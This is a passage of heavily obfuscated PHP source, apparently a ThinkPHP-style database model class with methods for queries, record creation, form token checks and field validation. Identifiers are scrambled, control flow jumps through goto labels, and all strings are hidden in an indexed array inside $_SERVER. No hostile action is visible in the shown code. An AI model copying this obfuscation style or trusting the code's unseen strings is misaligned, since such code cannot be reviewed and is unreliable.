$AÄó£‡¯÷ô[70] != substr($a³ôŞ·­Ï°, 0, 1) && !1 === strpos($a³ôŞ·­Ï°, $AÄó£‡¯÷ô[91]) && !1 === strpos($a³ôŞ·­Ï°, $AÄó£‡¯÷ô[244]) && !1 === strpos($a³ôŞ·­Ï°, $AÄó£‡¯÷ô[267]) && !1 === strpos($a³ôŞ·­Ï°, $AÄó£‡¯÷ô[268])) { unset($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[259]][$a³ôŞ·­Ï°]); } } } $this->_options_filter($BÄ‚ ¬±ƒÄ); return $BÄ‚ ¬±ƒÄ; goto d¾Ò‚ÅÖÆÚ; Eğ”Ç›Ëë: if (!isset($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[263]])) { $BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[263]] = $this->getTableName(); $FéÕ…Œ×†ã = $this->fields; } else { $FéÕ…Œ×†ã = $this->getDbFields(); } if (!empty($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[264]])) { $BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[263]] .= $AÄó£‡¯÷ô[50] . $BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[264]]; } $BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[265]] = $this->name; goto eŸëÌ†Úê¾; d¾Ò‚ÅÖÆÚ: } protected function _options_filter(&$E ÙŞ¡) { } protected function _parseType(&$C«ø¤¬Ü¯Ô, $dâÙŞ‡ƒ) { $AÛ‚øëêƒ =& $_SERVER[Ö]; if (empty($this->options[$AÛ‚øëêƒ[269]][$AÛ‚øëêƒ[4] . $dâÙŞ‡ƒ])) { $B­Ûòìœè… = strtolower($this->fields[$AÛ‚øëêƒ[236]][$dâÙŞ‡ƒ]); if (!1 !== strpos($B­Ûòìœè…, $AÛ‚øëêƒ[270])) { } elseif (!1 === strpos($B­Ûòìœè…, $AÛ‚øëêƒ[271]) && !1 !== strpos($B­Ûòìœè…, $AÛ‚øëêƒ[272])) { $C«ø¤¬Ü¯Ô[$dâÙŞ‡ƒ] = intval($C«ø¤¬Ü¯Ô[$dâÙŞ‡ƒ]); } elseif (!1 !== strpos($B­Ûòìœè…, $AÛ‚øëêƒ[273]) || !1 !== strpos($B­Ûòìœè…, $AÛ‚øëêƒ[274])) { $C«ø¤¬Ü¯Ô[$dâÙŞ‡ƒ] = floatval($C«ø¤¬Ü¯Ô[$dâÙŞ‡ƒ]); } elseif (!1 !== strpos($B­Ûòìœè…, $AÛ‚øëêƒ[275])) { $C«ø¤¬Ü¯Ô[$dâÙŞ‡ƒ] = (bool) $C«ø¤¬Ü¯Ô[$dâÙŞ‡ƒ]; } } } public function find($aÒË„·İ²ã = array()) { goto cŞ²àÓ«ÒÁ; E³•…¢§ºƒ: $aÒË„·İ²ã = $this->_parseOptions(); $F¦¿ÂÕá± = $this->db->select($aÒË„·İ²ã); if (!1 === $F¦¿ÂÕá±) { return !1; } goto AĞñ¢¾™å; AĞñ¢¾™å: if (empty($F¦¿ÂÕá±)) { return null; } $this->data = $F¦¿ÂÕá±[0]; $this->_afterFind($this->data, $aÒË„·İ²ã); goto AõÂ±ˆæµ; AõÂ±ˆæµ: if (!empty($this->options[$döÖ‹­ï[277]])) { return $this->returnResult($this->data, $this->options[$döÖ‹­ï[277]]); } return $this->data; goto Fî„ñåªóò; cŞ²àÓ«ÒÁ: $döÖ‹­ï =& $_SERVER[Ö]; if (is_numeric($aÒË„·İ²ã) || is_string($aÒË„·İ²ã)) { $c•±åã„§Ê[$this->getPk()] = intval($aÒË„·İ²ã); $this->options[$döÖ‹­ï[259]] = $c•±åã„§Ê; } $this->options[$döÖ‹­ï[276]] = 1; goto E³•…¢§ºƒ; Fî„ñåªóò: } protected function _afterFind(&$Cñá¨§÷×’, $b…±·´š’) { } protected function returnResult($bîÛ™¬¸Äù, $dŒæÓ·ñ½ = '') { $a® Ñ³µÛÊ =& $_SERVER[Ö]; if ($dŒæÓ·ñ½) { if (is_callable($dŒæÓ·ñ½)) { return call_user_func($dŒæÓ·ñ½, $bîÛ™¬¸Äù); } switch (strtolower($dŒæÓ·ñ½)) { case $a® Ñ³µÛÊ[278]: return json_encode($bîÛ™¬¸Äù); case $a® Ñ³µÛÊ[279]: return xml_encode($bîÛ™¬¸Äù); } } return $bîÛ™¬¸Äù; } public function parseFieldsMap($fäÏœ‚í­•, $eªÄ±‹Õ®à = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Aœ§é¸óß => $dœ’¬«ƒ…Á) { if ($eªÄ±‹Õ®à == 1) { if (isset($fäÏœ‚í­•[$dœ’¬«ƒ…Á])) { $fäÏœ‚í­•[$Aœ§é¸óß] = $fäÏœ‚í­•[$dœ’¬«ƒ…Á]; unset($fäÏœ‚í­•[$dœ’¬«ƒ…Á]); } } else { if (isset($fäÏœ‚í­•[$Aœ§é¸óß])) { $fäÏœ‚í­•[$dœ’¬«ƒ…Á] = $fäÏœ‚í­•[$Aœ§é¸óß]; unset($fäÏœ‚í­•[$Aœ§é¸óß]); } } } } return $fäÏœ‚í­•; } public function setField($F‰†–ôÉô’, $DÅÄ¬»“¾‘ = '') { if (is_array($F‰†–ôÉô’)) { $eˆòê¦Ëêá = $F‰†–ôÉô’; } else { $eˆòê¦Ëêá[$F‰†–ôÉô’] = $DÅÄ¬»“¾‘; } return $this->save($eˆòê¦Ëêá); } public function setAdd($AæÂª‘°–â, $CòÏ‰“Üœæ = 1) { $Aµ°ƒ±Ê§ =& $_SERVER[Ö]; $C‚´ĞˆŒ¿¹ = $AæÂª‘°–â . $Aµ°ƒ±Ê§[280] . $CòÏ‰“Üœæ; if ($CòÏ‰“Üœæ < 0) { $C‚´ĞˆŒ¿¹ = $AæÂª‘°–â . $CòÏ‰“Üœæ; } return $this->setField($AæÂª‘°–â, array($Aµ°ƒ±Ê§[281], $C‚´ĞˆŒ¿¹)); } public function getField($A™×¿˜çÜ«, $eàÌâµ°ìî = null) { $Dî­™õáââ =& $_SERVER[Ö]; $dÉùìÊùÚÒ[$Dî­™õáââ[257]] = $A™×¿˜çÜ«; $dÉùìÊùÚÒ = $this->_parseOptions($dÉùìÊùÚÒ); $A™×¿˜çÜ« = trim($A™×¿˜çÜ«); if (strpos($A™×¿˜çÜ«, $Dî­™õáââ[47])) { if (!isset($dÉùìÊùÚÒ[$Dî­™õáââ[276]])) { $dÉùìÊùÚÒ[$Dî­™õáââ[276]] = is_numeric($eàÌâµ°ìî) ? $eàÌâµ°ìî : $Dî­™õáââ[33]; } $b”Õ‡¶ÜÒò = $this->db->select($dÉùìÊùÚÒ); if (!empty($b”Õ‡¶ÜÒò)) { goto AÈ°‘ÎÂ¿ï; AÈ°‘ÎÂ¿ï: $dÎøĞÉÇ = explode($Dî­™õáââ[47], $A™×¿˜çÜ«); $A™×¿˜çÜ« = array_keys($b”Õ‡¶ÜÒò[0]); $e‰„‰î‡’· = array_shift($A™×¿˜çÜ«); goto f†¤Õ”±½¬; c¨Î‹Ûª„—: foreach ($b”Õ‡¶ÜÒò as $B”›¶¥²‚™) { $eĞ¦èòôø” = $B”›¶¥²‚™[$e‰„‰î‡’·]; if (2 == $bÃ°‚×ÚÀ) { $CĞğÚĞ‡[$eĞ¦èòôø”] = $B”›¶¥²‚™[$dĞÃî–†ÈÛ]; } else { $CĞğÚĞ‡[$eĞ¦èòôø”] = is_string($eàÌâµ°ìî) ? implode($eàÌâµ°ìî, $B”›¶¥²‚™) : $B”›¶¥²‚™; } } return $CĞğÚĞ‡; goto AéœÂäïø; f†¤Õ”±½¬: $dĞÃî–†ÈÛ = array_shift($A™×¿˜çÜ«); $CĞğÚĞ‡ = array(); $bÃ°‚×ÚÀ = count($dÎøĞÉÇ); goto c¨Î‹Ûª„—; AéœÂäïø: } } else { if (!0 !== $eàÌâµ°ìî) { $dÉùìÊùÚÒ[$Dî­™õáââ[276]] = is_numeric($eàÌâµ°ìî) ? $eàÌâµ°ìî : 1; } if ($eàÌâµ°ìî === $Dî­™õáââ[239]) { unset($dÉùìÊùÚÒ[$Dî­™õáââ[276]]); } $B”›¶¥²‚™ = $this->db->select($dÉùìÊùÚÒ); if (!empty($B”›¶¥²‚™)) { if ($eàÌâµ°ìî === $Dî­™õáââ[239]) { return reset($B”›¶¥²‚™[0]); } if (!0 !== $eàÌâµ°ìî && 1 == $dÉùìÊùÚÒ[$Dî­™õáââ[276]]) { return reset($B”›¶¥²‚™[0]); } foreach ($B”›¶¥²‚™ as $CÛ†ÅŒÔÊ) { $Fäô‘Îº‹æ[] = $CÛ†ÅŒÔÊ[$A™×¿˜çÜ«]; } return $Fäô‘Îº‹æ; } } return null; } public function create($bÂŠÑ·· = '', $aà¸ß•†È§ = '') { goto F•±¾â½ôÓ; aÛ®ÃŒÒİ¼: $bÂŠÑ·· = $this->parseFieldsMap($bÂŠÑ··, 0); $aà¸ß•†È§ = $aà¸ß•†È§ ? $aà¸ß•†È§ : (!empty($bÂŠÑ··[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$C“ÜŒÍ¹[257]])) { $DŠİË‹˜´‚ = $this->options[$C“ÜŒÍ¹[257]]; unset($this->options[$C“ÜŒÍ¹[257]]); } elseif ($aà¸ß•†È§ == THINK_MODEL_INSERT && isset($this->insertFields)) { $DŠİË‹˜´‚ = $this->insertFields; } elseif ($aà¸ß•†È§ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $DŠİË‹˜´‚ = $this->updateFields; } goto EÔš§»¥Öó; AÍÑ­É÷÷¤: return $bÂŠÑ··; goto b²İè•Î—â; F•±¾â½ôÓ: $C“ÜŒÍ¹ =& $_SERVER[Ö]; if (empty($bÂŠÑ··)) { $bÂŠÑ·· = $_POST; } elseif (is_object($bÂŠÑ··)) { $bÂŠÑ·· = get_object_vars($bÂŠÑ··); } if (empty($bÂŠÑ··) || !is_array($bÂŠÑ··)) { $this->error = think_lang($C“ÜŒÍ¹[255]); return !1; } goto aÛ®ÃŒÒİ¼; DÓìáíïƒ¶: if ($this->autoCheckFields) { $DŠİË‹˜´‚ = $this->getDbFields(); foreach ($bÂŠÑ·· as $e¹¹ƒèäì => $D­öë©‹¬ø) { if (!in_array($e¹¹ƒèäì, $DŠİË‹˜´‚)) { unset($bÂŠÑ··[$e¹¹ƒèäì]); } elseif (MAGIC_QUOTES_GPC && is_string($D­öë©‹¬ø)) { $bÂŠÑ··[$e¹¹ƒèäì] = stripslashes($D­öë©‹¬ø); } } } $this->autoOperation($bÂŠÑ··, $aà¸ß•†È§); $this->data = $bÂŠÑ··; goto AÍÑ­É÷÷¤; EÔš§»¥Öó: if (isset($DŠİË‹˜´‚)) { if (is_string($DŠİË‹˜´‚)) { $DŠİË‹˜´‚ = explode($C“ÜŒÍ¹[47], $DŠİË‹˜´‚); } if (think_config($C“ÜŒÍ¹[282])) { $DŠİË‹˜´‚[] = think_config($C“ÜŒÍ¹[283]); } foreach ($bÂŠÑ·· as $e¹¹ƒèäì => $D­öë©‹¬ø) { if (!in_array($e¹¹ƒèäì, $DŠİË‹˜´‚)) { unset($bÂŠÑ··[$e¹¹ƒèäì]); } } } if (!$this->autoValidation($bÂŠÑ··, $aà¸ß•†È§)) { return !1; } if (!$this->autoCheckToken($bÂŠÑ··)) { $this->error = think_lang($C“ÜŒÍ¹[284]); return !1; } goto DÓìáíïƒ¶; b²İè•Î—â: } public function autoCheckToken($A…ãÈ£ì¹’) { $aÃÈŠö·ï =& $_SERVER[Ö]; if (isset($this->options[$aÃÈŠö·ï[285]]) && !$this->options[$aÃÈŠö·ï[285]]) { return !0; } if (think_config($aÃÈŠö·ï[282])) { $F ÅÅÆÓš’ = think_config($aÃÈŠö·ï[283]); if (!isset($A…ãÈ£ì¹’[$F ÅÅÆÓš’]) || Session::get($F ÅÅÆÓš’)) { return !1; } list($e››š´†›, $FÆº°ÏŒ¼­) = explode($aÃÈŠö·ï[70], $A…ãÈ£ì¹’[$F ÅÅÆÓš’]); if ($FÆº°ÏŒ¼­ && Session::get($F ÅÅÆÓš’ . $aÃÈŠö·ï[91] . $e››š´†›) === $FÆº°ÏŒ¼­) { Session::remove($F ÅÅÆÓš’ . $aÃÈŠö·ï[91] . $e››š´†›); return !0; } if (think_config($aÃÈŠö·ï[286])) { Session::remove($F ÅÅÆÓš’ . $aÃÈŠö·ï[91] . $e››š´†›); } return !1; } return !0; } public function regex($DÜ„î³¨ç‹, $D©³ĞÚÅÉ) { $B›ê‚İÇ¾• =& $_SERVER[Ö]; $Bô¼˜¦ ë‰ = array($B›ê‚İÇ¾•[287] => $B›ê‚İÇ¾•[288], $B›ê‚İÇ¾•[289] => $B›ê‚İÇ¾•[290], $B›ê‚İÇ¾•[291] => $B›ê‚İÇ¾•[292], $B›ê‚İÇ¾•[293] => $B›ê‚İÇ¾•[294], $B›ê‚İÇ¾•[295] => $B›ê‚İÇ¾•[296], $B›ê‚İÇ¾•[297] => $B›ê‚İÇ¾•[298], $B›ê‚İÇ¾•[299] => $B›ê‚İÇ¾•[300], $B›ê‚İÇ¾•[274] => $B›ê‚İÇ¾•[301], $B›ê‚İÇ¾•[302] => $B›ê‚İÇ¾•[303]); if (isset($Bô¼˜¦ ë‰[strtolower($D©³ĞÚÅÉ)])) { $D©³ĞÚÅÉ = $Bô¼˜¦ ë‰[strtolower($D©³ĞÚÅÉ)]; } return preg_match($D©³ĞÚÅÉ, $DÜ„î³¨ç‹) === 1; } private function autoOperation(&$BÍÛÕšò“, $B ”´ÙÕÓÔ) { $dŞ‚Ì¦è¢¶ =& $_SERVER[Ö]; if (!empty($this->options[$dŞ‚Ì¦è¢¶[304]])) { $FÙù’Œ½È× = $this->options[$dŞ‚Ì¦è¢¶[304]]; unset($this->options[$dŞ‚Ì¦è¢¶[304]]); } elseif (!empty($this->_auto)) { $FÙù’Œ½È× = $this->_auto; } if (isset($FÙù’Œ½È×)) { foreach ($FÙù’Œ½È× as $cÁ”å©÷÷) { if (empty($cÁ”å©÷÷[2])) { $cÁ”å©÷÷[2] = THINK_MODEL_INSERT; } if ($B ”´ÙÕÓÔ == $cÁ”å©÷÷[2] || $cÁ”å©÷÷[2] == THINK_MODEL_BOTH) { switch (trim($cÁ”å©÷÷[3])) { case $dŞ‚Ì¦è¢¶[305]: case $dŞ‚Ì¦è¢¶[306]: $E¨Ó„Ø‹× = isset($cÁ”å©÷÷[4]) ? (array) $cÁ”å©÷÷[4] : array(); if (isset($BÍÛÕšò“[$cÁ”å©÷÷[0]])) { array_unshift($E¨Ó„Ø‹×, $BÍÛÕšò“[$cÁ”å©÷÷[0]]); } if ($dŞ‚Ì¦è¢¶[305] == $cÁ”å©÷÷[3]) { $BÍÛÕšò“[$cÁ”å©÷÷[0]] = call_user_func_array($cÁ”å©÷÷[1], $E¨Ó„Ø‹×); } else { $BÍÛÕšò“[$cÁ”å©÷÷[0]] = call_user_func_array(array(&$this, $cÁ”å©÷÷[1]), $E¨Ó„Ø‹×); } break; case $dŞ‚Ì¦è¢¶[257]: $BÍÛÕšò“[$cÁ”å©÷÷[0]] = $BÍÛÕšò“[$cÁ”å©÷÷[1]]; break; case $dŞ‚Ì¦è¢¶[307]: if ($dŞ‚Ì¦è¢¶[33] === $BÍÛÕšò“[$cÁ”å©÷÷[0]]) { unset($BÍÛÕšò“[$cÁ”å©÷÷[0]]); } break; case $dŞ‚Ì¦è¢¶[308]: default: $BÍÛÕšò“[$cÁ”å©÷÷[0]] = $cÁ”å©÷÷[1]; } if (!1 === $BÍÛÕšò“[$cÁ”å©÷÷[0]]) { unset($BÍÛÕšò“[$cÁ”å©÷÷[0]]); } } } } return $BÍÛÕšò“; } protected function autoValidation($A»³—ãÒ¶, $b¨¾ìÀÙ) { $Fª·­óç´‚ =& $_SERVER[Ö]; if (!empty($this->options[$Fª·­óç´‚[309]])) { $A§¡í¡í²¨ = $this->options[$Fª·­óç´‚[309]]; unset($this->options[$Fª·­óç´‚[309]]); } elseif (!empty($this->_validate)) { $A§¡í¡í²¨ = $this->_validate; } if (isset($A§¡í¡í²¨)) { if ($this->patchValidate) { $this->error = array(); } foreach ($A§¡í¡í²¨ as $d‡ÚÛ©Û“ƒ => $AêªË÷¼¦) { if (empty($AêªË÷¼¦[5]) || $AêªË÷¼¦[5] == THINK_MODEL_BOTH || $AêªË÷¼¦[5] == $b¨¾ìÀÙ) { if (0 == strpos($AêªË÷¼¦[2], $Fª·­óç´‚[310]) && strpos($AêªË÷¼¦[2], $Fª·­óç´‚[311])) { $AêªË÷¼¦[2] = think_lang(substr($AêªË÷¼¦[2], 2, -1)); } $AêªË÷¼¦[3] = isset($AêªË÷¼¦[3]) ? $AêªË÷¼¦[3] : THINK_EXISTS_VALIDATE; $AêªË÷¼¦[4] = isset($AêªË÷¼¦[4]) ? $AêªË÷¼¦[4] : $Fª·­óç´‚[312]; switch ($AêªË÷¼¦[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($A»³—ãÒ¶, $AêªË÷¼¦)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Fª·­óç´‚[33] != trim($A»³—ãÒ¶[$AêªË÷¼¦[0]])) { if (!1 === $this->_validationField($A»³—ãÒ¶, $AêªË÷¼¦)) { return !1; } } break; default: if (isset($A»³—ãÒ¶[$AêªË÷¼¦[0]])) { if (!1 === $this->_validationField($A»³—ãÒ¶, $AêªË÷¼¦)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($a©é—°–ÏÀ, $a„ÛÅàÃŞˆ) { if (!1 === $this->_validationFieldItem($a©é—°–ÏÀ, $a„ÛÅàÃŞˆ)) { if ($this->patchValidate) { $this->error[$a„ÛÅàÃŞˆ[0]] = $a„ÛÅàÃŞˆ[2]; } else { $this->error = $a„ÛÅàÃŞˆ[2]; return !1; } } return; } protected function _validationFieldItem($dğ›°æ½’¿, $fÊÒšµï¹â) { $a¹ğ˜ÅÃÁÎ =& $_SERVER[Ö]; switch (strtolower(trim($fÊÒšµï¹â[4]))) { case $a¹ğ˜ÅÃÁÎ[305]: case $a¹ğ˜ÅÃÁÎ[306]: $b‘Â•Ôïƒ = isset($fÊÒšµï¹â[6]) ? (array) $fÊÒšµï¹â[6] : array(); if (is_string($fÊÒšµï¹â[0]) && strpos($fÊÒšµï¹â[0], $a¹ğ˜ÅÃÁÎ[47])) { $fÊÒšµï¹â[0] = explode($a¹ğ˜ÅÃÁÎ[47], $fÊÒšµï¹â[0]); } if (is_array($fÊÒšµï¹â[0])) { foreach ($fÊÒšµï¹â[0] as $eŒã„àÛ¹) { $D‚‡†Üº½Ì[$eŒã„àÛ¹] = $dğ›°æ½’¿[$eŒã„àÛ¹]; } array_unshift($b‘Â•Ôïƒ, $D‚‡†Üº½Ì); } else { array_unshift($b‘Â•Ôïƒ, $dğ›°æ½’¿[$fÊÒšµï¹â[0]]); } if ($a¹ğ˜ÅÃÁÎ[305] == $fÊÒšµï¹â[4]) { return call_user_func_array($fÊÒšµï¹â[1], $b‘Â•Ôïƒ); } else { return call_user_func_array(array(&$this, $fÊÒšµï¹â[1]), $b‘Â•Ôïƒ); } case $a¹ğ˜ÅÃÁÎ[313]: return $dğ›°æ½’¿[$fÊÒšµï¹â[0]] == $dğ›°æ½’¿[$fÊÒšµï¹â[1]]; case $a¹ğ˜ÅÃÁÎ[314]: if (is_string($fÊÒšµï¹â[0]) && strpos($fÊÒšµï¹â[0], $a¹ğ˜ÅÃÁÎ[47])) { $fÊÒšµï¹â[0] = explode($a¹ğ˜ÅÃÁÎ[47], $fÊÒšµï¹â[0]); } $A¡›¥ÙÒ‘Ã = array(); if (is_array($fÊÒšµï¹â[0])) { foreach ($fÊÒšµï¹â[0] as $eŒã„àÛ¹) { $A¡›¥ÙÒ‘Ã[$eŒã„àÛ¹] = $dğ›°æ½’¿[$eŒã„àÛ¹]; } } else { $A¡›¥ÙÒ‘Ã[$fÊÒšµï¹â[0]] = $dğ›°æ½’¿[$fÊÒšµï¹â[0]]; } if (!empty($dğ›°æ½’¿[$this->getPk()])) { $A¡›¥ÙÒ‘Ã[$this->getPk()] = array($a¹ğ˜ÅÃÁÎ[315], $dğ›°æ½’¿[$this->getPk()]); } if ($this->where($A¡›¥ÙÒ‘Ã)->find()) { return !1; } return !0; default: return $this->check($dğ›°æ½’¿[$fÊÒšµï¹â[0]], $fÊÒšµï¹â[1], $fÊÒšµï¹â[4]); } } public function check($B¤†¡˜¤ôÌ, $AÊ…ëñÕí, $c®Ú½÷Ê²Ğ = "\162\x65\147\145\x78") { $cöß ¥¾†Õ =& $_SERVER[Ö]; $c®Ú½÷Ê²Ğ = strtolower(trim($c®Ú½÷Ê²Ğ)); switch ($c®Ú½÷Ê²Ğ) { case $cöß ¥¾†Õ[7]: case $cöß ¥¾†Õ[316]: $bš‘ÊÊÌ‚ = is_array($AÊ…ëñÕí) ? $AÊ…ëñÕí : explode($cöß ¥¾†Õ[47], $AÊ…ëñÕí); return $c®Ú½÷Ê²Ğ == $cöß ¥¾†Õ[7] ? in_array($B¤†¡˜¤ôÌ, $bš‘ÊÊÌ‚) : !in_array($B¤†¡˜¤ôÌ, $bš‘ÊÊÌ‚); case $cöß ¥¾†Õ[317]: case $cöß ¥¾†Õ[318]: if (is_array($AÊ…ëñÕí)) { $B­ÏØÁÒŒ = $AÊ…ëñÕí[0]; $b¥«£ÚŒá = $AÊ…ëñÕí[1]; } else { list($B­ÏØÁÒŒ, $b¥«£ÚŒá) = explode($cöß ¥¾†Õ[47], $AÊ…ëñÕí); } return $c®Ú½÷Ê²Ğ == $cöß ¥¾†Õ[317] ? $B¤†¡˜¤ôÌ >= $B­ÏØÁÒŒ && $B¤†¡˜¤ôÌ <= $b¥«£ÚŒá : $B¤†¡˜¤ôÌ < $B­ÏØÁÒŒ || $B¤†¡˜¤ôÌ > $b¥«£ÚŒá; case $cöß ¥¾†Õ[319]: case $cöß ¥¾†Õ[320]: return $c®Ú½÷Ê²Ğ == $cöß ¥¾†Õ[319] ? $B¤†¡˜¤ôÌ == $AÊ…ëñÕí : $B¤†¡˜¤ôÌ != $AÊ…ëñÕí; case $cöß ¥¾†Õ[321]: $D±¿¾Äô‹İ = mb_strlen($B¤†¡˜¤ôÌ, $cöß ¥¾†Õ[322]); if (strpos($AÊ…ëñÕí, $cöß ¥¾†Õ[47])) { list($B­ÏØÁÒŒ, $b¥«£ÚŒá) = explode($cöß ¥¾†Õ[47], $AÊ…ëñÕí); return $D±¿¾Äô‹İ >= $B­ÏØÁÒŒ && $D±¿¾Äô‹İ <= $b¥«£ÚŒá; } else { return $D±¿¾Äô‹İ == $AÊ…ëñÕí; } case $cöß ¥¾†Õ[323]: list($DòãåÊô, $A±Õ›ÖøÚ) = explode($cöß ¥¾†Õ[47], $AÊ…ëñÕí); if (!is_numeric($DòãåÊô)) { $DòãåÊô = strtotime($DòãåÊô); } if (!is_numeric($A±Õ›ÖøÚ)) { $A±Õ›ÖøÚ = strtotime($A±Õ›ÖøÚ); } return NOW_TIME >= $DòãåÊô && NOW_TIME <= $A±Õ›ÖøÚ; case $cöß ¥¾†Õ[324]: return in_array(get_client_ip(), explode($cöß ¥¾†Õ[47], $AÊ…ëñÕí)); case $cöß ¥¾†Õ[325]: return !in_array(get_client_ip(), explode($cöß ¥¾†Õ[47], $AÊ…ëñÕí)); case $cöß ¥¾†Õ[312]: default: return $this->regex($B¤†¡˜¤ôÌ, $AÊ…ëñÕí); } } public function query($C‹ƒÜÏê­ï, $aª‡£³‡¿† = false) { $bÑ“‡Ïßªº =& $_SERVER[Ö]; if (!is_bool($aª‡£³‡¿†) && !is_array($aª‡£³‡¿†)) { $aª‡£³‡¿† = func_get_args(); array_shift($aª‡£³‡¿†); } $C‹ƒÜÏê­ï = str_replace(array($bÑ“‡Ïßªº[213], $bÑ“‡Ïßªº[326]), $bÑ“‡Ïßªº[50], $C‹ƒÜÏê­ï); $C‹ƒÜÏê­ï = $this->parseSql($C‹ƒÜÏê­ï, $aª‡£³‡¿†); return $this->db->query($C‹ƒÜÏê­ï); } public function execute($Fî§ºš­ŠÕ, $FëœŒå° = false) { if (!is_bool($FëœŒå°) && !is_array($FëœŒå°)) { $FëœŒå° = func_get_args(); array_shift($FëœŒå°); } $Fî§ºš­ŠÕ = $this->parseSql($Fî§ºš­ŠÕ, $FëœŒå°); return $this->db->execute($Fî§ºš­ŠÕ); } protected function parseSql($e¾ˆ¤Äˆ¥, $eªŒ¥ĞÈ÷) { $DïÄš…âÀ– =& $_SERVER[Ö]; if (!0 === $eªŒ¥ĞÈ÷) { $A’ÌÏ‘ˆóÅ = $this->_parseOptions(); $e¾ˆ¤Äˆ¥ = $this->db->parseSql($e¾ˆ¤Äˆ¥, $A’ÌÏ‘ˆóÅ); } elseif (is_array($eªŒ¥ĞÈ÷)) { $eªŒ¥ĞÈ÷ = array_map(array($this->db, $DïÄš…âÀ–[327]), $eªŒ¥ĞÈ÷); $e¾ˆ¤Äˆ¥ = vsprintf($e¾ˆ¤Äˆ¥, $eªŒ¥ĞÈ÷); } else { $e¾ˆ¤Äˆ¥ = strtr($e¾ˆ¤Äˆ¥, array($DïÄš…âÀ–[328] => $this->getTableName(), $DïÄš…âÀ–[329] => think_config($DïÄš…âÀ–[228]))); } $this->db->setModel($this->name); return $e¾ˆ¤Äˆ¥; } public function db($F¾Ü–õ¡†Ú = '', $bï†—‚‹² = '', $BÎ”¢ÛÒ‰® = array()) { goto C¦ÈÚ§¡íÉ; föÔ£Û£©œ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto C‚ÌÛ÷İ¶Ï; Bİù˜ùêÁÓ: static $d°³†Ç­âô = array(); if (!isset($d°³†Ç­âô[$F¾Ü–õ¡†Ú]) || isset($d°³†Ç­âô[$F¾Ü–õ¡†Ú]) && $bï†—‚‹² && $Eø½ˆ­µŒƒ[$F¾Ü–õ¡†Ú] != $bï†—‚‹²) { if (!empty($bï†—‚‹²) && is_string($bï†—‚‹²) && !1 === strpos($bï†—‚‹², $FØ˜—»…Òª[8])) { $bï†—‚‹² = think_config($bï†—‚‹²); } $d°³†Ç­âô[$F¾Ü–õ¡†Ú] = Db::getInstance($bï†—‚‹²); } elseif (NULL === $bï†—‚‹²) { $d°³†Ç­âô[$F¾Ü–õ¡†Ú]->close(); unset($d°³†Ç­âô[$F¾Ü–õ¡†Ú]); return; } if (!empty($BÎ”¢ÛÒ‰®)) { if (is_string($BÎ”¢ÛÒ‰®)) { parse_str($BÎ”¢ÛÒ‰®, $BÎ”¢ÛÒ‰®); } foreach ($BÎ”¢ÛÒ‰® as $E‡ŒèÚªÑÚ => $fôÈ×Ì¸›) { $this->setProperty($E‡ŒèÚªÑÚ, $fôÈ×Ì¸›); } } goto F‡¦â¬˜ˆĞ; F‡¦â¬˜ˆĞ: $Eø½ˆ­µŒƒ[$F¾Ü–õ¡†Ú] = $bï†—‚‹²; $this->db = $d°³†Ç­âô[$F¾Ü–õ¡†Ú]; $this->_after_db(); goto föÔ£Û£©œ; C¦ÈÚ§¡íÉ: $FØ˜—»…Òª =& $_SERVER[Ö]; if ($FØ˜—»…Òª[33] === $F¾Ü–õ¡†Ú && $this->db) { return $this->db; } static $Eø½ˆ­µŒƒ = array(); goto Bİù˜ùêÁÓ; C‚ÌÛ÷İ¶Ï: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $b‹Ÿ‹Î©àñ = get_class($this); if ($b‹Ÿ‹Î©àñ == $_SERVER[Ö][330]) { return $this->name; } $this->name = substr($b‹Ÿ‹Î©àñ, 0, -5); } return $this->name; } public function getTableName() { $aóõñÆÀ =& $_SERVER[Ö]; if (empty($this->trueTableName)) { $EÁá¡‰Š = !empty($this->tablePrefix) ? $this->tablePrefix : $aóõñÆÀ[33]; if (!empty($this->tableName)) { $EÁá¡‰Š .= $this->tableName; } else { $EÁá¡‰Š .= think_parse_name($this->name); } $this->trueTableName = strtolower($EÁá¡‰Š); } return (!empty($this->dbName) ? $this->dbName . $aóõñÆÀ[91] : $aóõñÆÀ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $aÄ›Œ©§ =& $_SERVER[Ö]; return isset($this->fields[$aÄ›Œ©§[235]]) ? $this->fields[$aÄ›Œ©§[235]] : $this->pk; } public function getDbFields() { $fÂ·¶İÚ±ª =& $_SERVER[Ö]; if (isset($this->options[$fÂ·¶İÚ±ª[263]])) { $E÷ÈªÍŸœ¨ = $this->db->getFields($this->options[$fÂ·¶İÚ±ª[263]]); return $E÷ÈªÍŸœ¨ ? array_keys($E÷ÈªÍŸœ¨) : !1; } if ($this->fields) { $E÷ÈªÍŸœ¨ = $this->fields; unset($E÷ÈªÍŸœ¨[$fÂ·¶İÚ±ª[234]], $E÷ÈªÍŸœ¨[$fÂ·¶İÚ±ª[235]], $E÷ÈªÍŸœ¨[$fÂ·¶İÚ±ª[236]], $E÷ÈªÍŸœ¨[$fÂ·¶İÚ±ª[233]]); return $E÷ÈªÍŸœ¨; } return !1; } public function data($eš¤Œ¯ó´ = '') { $fæ‰‰ö‚½ =& $_SERVER[Ö]; if ($fæ‰‰ö‚½[33] === $eš¤Œ¯ó´ && !empty($this->data)) { return $this->data; } if (is_object($eš¤Œ¯ó´)) { $eš¤Œ¯ó´ = get_object_vars($eš¤Œ¯ó´); } elseif (is_string($eš¤Œ¯ó´)) { 